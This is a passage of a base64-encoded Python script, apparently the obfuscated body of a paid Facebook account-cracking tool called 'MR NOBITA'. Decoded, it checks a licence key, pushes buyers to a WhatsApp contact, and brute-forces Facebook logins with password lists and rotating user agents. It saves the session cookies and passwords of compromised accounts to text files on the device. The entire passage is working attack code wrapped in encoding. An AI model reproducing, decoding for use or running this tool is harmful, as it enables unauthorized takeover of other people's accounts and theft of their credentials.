ucmVhZCgpDQoNCiAgICBleGNlcHQgSU9FcnJvcjoNCg0KICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCiAgICAgICAgcHAoKQ0KDQogICAgciA9IHJlcXVlc3RzLmdldChtYWhkaSkudGV4dA0KDQogICAgaWYga2V5MSBpbiByOg0KDQogICAgICAgIHByaW50KCJcMzNbMTszMm1Zb3VyIEtleSBpcyBTdWNjZXNzZnVsbHkgQXBwcm92ZWQiKQ0KDQogICAgICAgIHRpbWUuc2xlZXAoMC41KQ0KDQogICAgICAgIGtobGQoKQ0KDQogICAgZWxzZToNCg0KICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCg0KICAgICAgICBwcmludCAobG9nbykNCg0KICAgICAgICBwcmludCAoJyAgICAgICAgIEZVQ0sgWU9VUiBCWVBBU1MgU1lTVEVNIEJST/Cfk4wgJykNCg0KICAgICAgICBwcmludCgnJykNCg0KICAgICAgICBwcmludCAoJyAgICAgICAgIFlvdSBEb250IEhhdmUgU3Vic2NycHRpb24nKQ0KICAgICAgICANCiAgICAgICAgcHJpbnQoJycpDQogICAgICAgIA0KICAgICAgICBwcmludCAoJyAgICAgICAgIFRISVMgSVMgTVIgTk9CSVRBIFBBSUQgVE9PTPCfkrggJykNCg0KICAgICAgICBwcmludCAoJycpDQoNCiAgICAgICAgcHJpbnQgKCcgICAgICAgICBZT1VSIEtFWSA6IFwwMzNbMTs5M20nICsga2V5MSkNCg0KICAgICAgICBwcmludCAoJycpDQoNCiAgICAgICAgcHJpbnQgKCcgICAgICAgICBceDFiWzA7MzRtSUYgWU9VIEJVWSBUT09MUyBDT05UQUNUIE1F8J+TniAnKQ0KDQogICAgICAgIHByaW50ICgnJykNCg0KICAgICAgICBpbnB1dCgnXDAzM1sxOzkybSAgICAgICAgIElmIHlvdSB3YW50IHRvIGJ1eSBwcmVzaCBlbnRlcicpDQoNCiAgICAgICAgb3Muc3lzdGVtKCdhbSBzdGFydCBodHRwczovL3dhLm1lLys4ODAxOTQxMDEwMTg5P3RleHQ9QXNzYWxhbW93YWxpa29tJTIwU2lyLCUyMEklMjBXYW50JTIwVG8lMjBCdXklMjBZb3VyJTIwTk9CSVRBJTIwUGFpZCUyMFRvb2xzLiUyME15JTIwS2V5OiUyMCcra2V5MSkNCg0KICAgICAgICBtZXgoKQ0KDQojIyMjIyMjIyMjIyMjIyMjIyMNCg0KIA0KDQogICANCg0KZGVmIHJjcmFjayh1aWQscHd4LHRsKToNCg0KICAgICNwcmludCh1c2VyKQ0KDQogICAgZ2xvYmFsIGxvb3ANCg0KICAgIGdsb2JhbCBjcHMNCg0KICAgIGdsb2JhbCBva3MNCg0KICAgIGdsb2JhbCBwcm94eQ0KDQogICAgdHJ5Og0KDQogICAgICAgIGZvciBwcyBpbiBwd3g6DQoNCiAgICAgICAgICAgIHBybyA9IHJhbmRvbS5jaG9pY2UodWdlbikNCg0KICAgICAgICAgICAgc2Vzc2lvbiA9IHJlcXVlc3RzLlNlc3Npb24oKQ0KDQogICAgICAgICAgICBmcmVlX2ZiID0gc2Vzc2lvbi5nZXQoJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbScpLnRleHQNCg0KICAgICAgICAgICAgbG9nX2RhdGEgPSB7DQoNCiAgICAgICAgICAgICAgICAibHNkIjpyZS5zZWFyY2goJ25hbWU9ImxzZCIgdmFsdWU9IiguKj8pIicsIHN0cihmcmVlX2ZiKSkuZ3JvdXAoMSksDQoNCiAgICAgICAgICAgICJqYXpvZXN0IjpyZS5zZWFyY2goJ25hbWU9Imphem9lc3QiIHZhbHVlPSIoLio/KSInLCBzdHIoZnJlZV9mYikpLmdyb3VwKDEpLA0KDQogICAgICAgICAgICAibV90cyI6cmUuc2VhcmNoKCduYW1lPSJtX3RzIiB2YWx1ZT0iKC4qPykiJywgc3RyKGZyZWVfZmIpKS5ncm91cCgxKSwNCg0KICAgICAgICAgICAgImxpIjpyZS5zZWFyY2goJ25hbWU9ImxpIiB2YWx1ZT0iKC4qPykiJywgc3RyKGZyZWVfZmIpKS5ncm91cCgxKSwNCg0KICAgICAgICAgICAgInRyeV9udW1iZXIiOiIwIiwNCg0KICAgICAgICAgICAgInVucmVjb2duaXplZF90cmllcyI6IjAiLA0KDQogICAgICAgICAgICAiZW1haWwiOnVpZCwNCg0KICAgICAgICAgICAgInBhc3MiOnBzLA0KDQogICAgICAgICAgICAibG9naW4iOiJMb2cgSW4ifQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBoZWFkZXJfZnJlZWZiID0geydhdXRob3JpdHknOiAneC5mYWNlYm9vay5jb20nLA0KCQkJJ21ldGhvZCc6ICdHRVQnLA0KCQkJJ3NjaGVtZSc6J2h0dHBzJywNCgkJCSdhY2NlcHQnOiAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC43JywNCgkJCSdhY2NlcHQtZW5jb2RpbmcnOidnemlwLCBkZWZsYXRlLCBicicsDQoJCQknYWNjZXB0LWxhbmd1YWdlJzogJ2VuLVVTLGVuO3E9MC45JywNCiAgICAgICAgICAgICdyZWZlcmVyJzogJ2h0dHBzOi8veC5mYWNlYm9vay5jb20vP3N0eXBlPWxvJmpsb3U9QWZmblRRZE9BYi01WGdCY0N5bDJVd0NmQTJfbW9wOTJzSjU1NThsRGNEVWNmUGNGOTFCYUJOcTFWVUF4SWpEQy1zZlp2TWtjcFNNMVNUcjBVYl8xZWFueTY2TWpmVC1NbkNISW82RnJPS28zakEmc211aD0yNDQ5NSZsaD1BY19NRk1yNFVqNGN3OWo3bEtjJl9yZHInLA0KICAgICAgICAgICAgJ3NlYy1jaC11YSc6JyJDaHJvbWl1bSI7IHY9IjExMSIsICJOb3QpQTsgQnJhbmQiOyB2PSI4IicsDQoJCQknc2VjLWNoLXVhLW1vYmlsZSc6ICc/MScsDQoJCQknc2VjLWNoLXVhLXBsYXRmb3JtJzogJyJBbmRyb2lkIicsDQoJCQknc2VjLWZldGNoLWRlc3QnOiAnZG9jdW1lbnQnLA0KCQkgICAnc2VjLWZldGNoLW1vZGUnOiAnbmF2aWdhdGUnLA0KCQkJJ3NlYy1mZXRjaC1zaXRlJzogJ3NhbWUtb3JpZ2luJywNCgkJCSd1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzJzogJzEnLA0KCQkJJ3VzZXItYWdlbnQnOiBwcm8sfQ0KDQogICAgICAgICAgICBsbyA9IHNlc3Npb24ucG9zdCgnaHR0cHM6Ly94LmZhY2Vib29rLmNvbS8/c3R5cGU9bG8mamxvdT1BZmZuVFFkT0FiLTVYZ0JjQ3lsMlV3Q2ZBMl9tb3A5MnNKNTU1OGxEY0RVY2ZQY0Y5MUJhQk5xMVZVQXhJakRDLXNmWnZNa2NwU00xU1RyMFViXzFlYW55NjZNamZULU1uQ0hJbzZGck9LbzNqQSZzbXVoPTI0NDk1JmxoPUFjX01GTXI0VWo0Y3c5ajdsS2MmcmVmaWQ9OCZoaWRlX2RpYWxvZz0xJnJlZnNyYz1kZXByZWNhdGVkJl9yZHInLGRhdGE9bG9nX2RhdGEsaGVhZGVycz1oZWFkZXJfZnJlZWZiKS50ZXh0DQoNCiAgICAgICAgICAgIGxvZ19jb29raWVzPXNlc3Npb24uY29va2llcy5nZXRfZGljdCgpLmtleXMoKQ0KDQogICAgICAgICAgICBpZiAnY191c2VyJyBpbiBsb2dfY29va2llczoNCg0KICAgICAgICAgICAgICAgIGNva2k9IjsiLmpvaW4oW2tleSsiPSIrdmFsdWUgZm9yIGtleSx2YWx1ZSBpbiBzZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKS5pdGVtcygpXSkNCg0KICAgICAgICAgICAgICAgIGNpZCA9IGNva2lbNzoyMl0NCg0KICAgICAgICAgICAgICAgIHByaW50KCdcclxyXDAzM1sxOzMybVtOT0JJVEEtT0vwn5KaXSAnICt1aWQrICcgfCAnICtwcysgICAgJyAgXG5cMDMzWzE7MzVtW/CfkoldXDAzM1sxOzMybUNPT0tJRSA9IFwwMzNbMTszNG0nK2Nva2krICAnIFxuXDAzM1sxOzM2bVvinKhdIFtBR0VOVF0gPSBcMDMzWzE7MzVtJytwcm8rJyAgXDAzM1swOzk3bScpDQoNCiAgICAgICAgICAgICAgICBjZWtfYXBrKHNlc3Npb24sY29raSkNCg0KICAgICAgICAgICAgICAgIG9wZW4oJy9zZGNhcmQvTk9CSVRBLU9LLnR4dCcsICdhJykud3JpdGUoIGNpZCsnIHwgJytwcysnXG4nKQ0KDQogICAgICAgICAgICAgICAgb2tzLmFwcGVuZChjaWQpDQoNCiAgICAgICAgICAgICAgICBicmVhaw0KDQogICAgICAgICAgICBlbGlmICdjaGVja3BvaW50JyBpbiBsb2dfY29va2llczoNCg0KICAgICAgICAgICAgICAgIGNva2k9IjsiLmpvaW4oW2tleSsiPSIrdmFsdWUgZm9yIGtleSx2YWx1ZSBpbiBzZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKS5pdGVtcygpXSkNCg0KICAgICAgICAgICAgICAgIGNpZCA9IGNva2lbMjQ6MzldDQoNCiAgICAgICAgICAgICAgICBwcmludCgnXHJcclwzM1sxOzMwbVtOT0JJVEEtQ1BdICAnICt1aWQrICcgfCAnICtwcysgICAgICAgICAgICcgIFwzM1swOzk3bScpDQoNCiAgICAgICAgICAgICAgICBvcGVuKCcvc2RjYXJkL05PQklUQS1DUC50eHQnLCAnYScpLndyaXRlKCBjaWQrJyB8ICcrcHMrJyBcbicpDQogICAgICAgICAgICAgICAgY3BzLmFwcGVuZChjaWQpDQogICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgbG9vcCs9MQ0KICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKCdcclxyJXNbTk9CSVRBLU0yXSBbJXMvJXNdICBPSzotICVzICBDUDotICVzICclKEgsbG9vcCx0bCxsZW4ob2tzKSxsZW4oY3BzKSkpLA0KDQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQ0KDQogICAgZXhjZXB0Og0KDQogICAgICAgIHBhc3MNCg0KDQoNCm1leCgp"))